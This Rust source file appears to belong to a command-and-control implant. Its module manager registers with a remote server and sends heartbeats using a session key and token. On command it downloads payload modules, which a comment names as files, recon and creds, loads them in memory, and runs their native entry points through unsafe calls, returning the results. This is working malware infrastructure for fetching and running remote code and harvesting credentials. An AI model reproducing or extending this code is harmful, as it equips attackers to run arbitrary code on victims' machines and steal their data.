//! 内嵌模块管理器（从 libra-engine::module_manager 搬迁）：WS 消息处理中
//! 需要下载 files/recon/creds 等模块时使用，独立于 agent 本体的管理器。

use std::collections::HashMap;

use libra_comm::http::HttpCommunicator;
use libra_load::{load_module, LoadedModule, ModuleMainFn};

const MODULE_OUTPUT_CAP: usize = 16 * 1024 * 1024; // 16 MB per module result

pub struct ModuleManager {
    http: HttpCommunicator,
    agent_id: String,
    session_key: Option<[u8; 32]>,
    loaded: HashMap<String, LoadedModule>,
}

impl ModuleManager {
    pub fn new(
        server_url: &str,
        register_path: &str,
        heartbeat_path: &str,
        result_path: &str,
        agent_id: String,
        session_key: Option<[u8; 32]>,
        session_token: Option<String>,
    ) -> Self {
        let mut http = HttpCommunicator::new(server_url, register_path, heartbeat_path, result_path);
        if let Some(t) = session_token {
            http.set_session_token(t);
        }
        Self {
            http,
            agent_id,
            session_key,
            loaded: HashMap::new(),
        }
    }

    /// Download and in-memory load a module if not already loaded.
    async fn ensure_loaded(&mut self, name: &str) -> Result<(), String> {
        if self.loaded.contains_key(name) {
            return Ok(());
        }
        let key = self
            .session_key
            .as_ref()
            .ok_or("no session key — cannot download modules")?;

        let bytes = self
            .http
            .download_module(name, &self.agent_id, key)
            .await?;
        let module = load_module(&bytes, "module_main")?;

        if !module.name.is_empty() && module.name != name {
            return Err(format!(
                "module content mismatch: requested '{name}', downloaded '{}'",
                module.name
            ));
        }

        self.loaded.insert(name.to_string(), module);
        Ok(())
    }

    /// Download/load a module and resolve its entry point, returning the entry
    /// plus the owned input. Caller must NOT hold `&mut self` while executing.
    pub async fn prepare(&mut self, name: &str, input: &str) -> Result<(ModuleMainFn, String), String> {
        self.ensure_loaded(name).await?;
        let main = self
            .loaded
            .get(name)
            .map(|m| m.main)
            .ok_or("module not loaded")?;
        Ok((main, input.to_string()))
    }
}

/// Execute a resolved module entry point on the blocking pool (module runtime).
pub async fn execute_module(main: ModuleMainFn, input: &str) -> Result<String, String> {
    let input = input.to_string();
    tokio::task::spawn_blocking(move || {
        let mut out = vec![0u8; MODULE_OUTPUT_CAP];
        let written = unsafe { main(input.as_ptr(), input.len(), out.as_mut_ptr(), out.len()) };
        if written > out.len() {
            return Err("module output exceeded capacity".to_string());
        }
        String::from_utf8(out[..written].to_vec())
            .map_err(|e| format!("module returned invalid UTF-8: {}", e))
    })
    .await
    .map_err(|e| format!("module task panicked: {}", e))?
}

/// Download/load a module under the lock, then execute its entry **without**
/// holding the module manager lock so independent tasks run in parallel.
pub async fn run_module(
    mm: &std::sync::Arc<tokio::sync::Mutex<ModuleManager>>,
    name: &str,
    input: serde_json::Value,
) -> String {
    let prepared = {
        let mut mgr = mm.lock().await;
        match mgr.prepare(name, &input.to_string()).await {
            Ok(p) => p,
            Err(e) => return serde_json::json!({ "error": e }).to_string(),
        }
    };
    match execute_module(prepared.0, &prepared.1).await {
        Ok(r) => r,
        Err(e) => serde_json::json!({ "error": e }).to_string(),
    }
}
